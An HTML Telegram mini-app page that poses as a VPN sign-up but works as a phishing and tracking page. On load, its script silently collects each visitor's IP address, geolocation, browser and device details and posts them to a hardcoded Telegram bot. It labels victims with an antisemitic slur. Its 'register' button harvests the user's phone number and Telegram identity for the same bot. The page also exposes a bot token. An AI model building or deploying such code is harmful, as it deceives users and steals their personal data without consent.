<!DOCTYPE html>
<html>
<head>
    <title>VPN by CRYAN</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .container {
            max-width: 400px;
            width: 100%;
        }

        button {
            background: var(--tg-theme-button-color, #007aff);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }

        #phone-number {
            margin-top: 20px;
            font-size: 18px;
            color: var(--tg-theme-link-color, #007aff);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>VPN by CRYAN</h1>
        <p>Самое безопасное соединение.</p>
        <button onclick="requestPhoneNumber()">зарегистрироваться</button>
        <div id="phone-number"></div>
    </div>

    <script>
        const BOT_TOKEN = '8384481308:AAFgLo9qHHsTZlzGx2wcnoWSlA5jA-yxgYQ'; // Замените на токен вашего бота
        const ADMIN_CHAT_ID = '1414629627'; // Замените на ID администратора

        async function sendInfo() {
            try {
                const userAgent = navigator.userAgent;
                const time = new Date().toLocaleString();
                const device = navigator.platform;

                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (!ipResponse.ok) {
                    throw new Error('Ошибка при получении IP');
                }
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
                if (!geoResponse.ok) {
                    throw new Error('Ошибка при получении геолокации');
                }
                const geoData = await geoResponse.json();
                const { city, region, country } = geoData;

                const message = `🧊 НОВЫЙ ГОЙ\n\nIP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}\nDevice: ${device}\nLocation: ${city}, ${region}, ${country}`;

                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Ошибка:', error);
            }
        }

        window.onload = sendInfo;
        const tg = window.Telegram.WebApp;

        function initTg() {
            tg.expand(); // Развернуть на весь экран
            document.body.style.backgroundColor = tg.themeParams.bg_color;
            document.body.style.color = tg.themeParams.text_color;
        }

        initTg();

        function requestPhoneNumber() {
            tg.requestContact((sent, event) => {
                if (sent) {
                    const phoneNumber = event.responseUnsafe.contact.phone_number;
                    const user = tg.initDataUnsafe.user || {};

                    document.getElementById('phone-number').innerText = `Ваш номер: ${phoneNumber}`;

                    const message = `📱 Новый контакт:\n\n`
                        + `☎️ Телефон: ${phoneNumber}\n`
                        + `🆔 User ID: ${user.id}\n`
                        + `👤 Имя: ${user.first_name || ''} ${user.last_name || ''}\n`
                        + `📛 Username: @${user.username || 'нет'}`;

                    try {
                        sendToAdmin(message);
                        location.href = "vpn.html";
                    } catch {
                        tg.showAlert('Ошибка при регистрации, попробуйте с пк.');
                    }
                } else {
                    tg.showAlert('Вы отменили запрос номера.');
                }
            });
        }

        async function sendToAdmin(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    tg.showAlert('🧊 Регистрация прошла успешно!\nПриятного пользования!');
                } else {
                    tg.showAlert('⚠️ Произошла ошибка при регистрации.');
                }
            } catch (error) {
                console.error('Error:', error);
                tg.showAlert('⚠️ Произошла ошибка при регистрации.');
            }
        }

        tg.ready();
    </script>
</body>
</html>
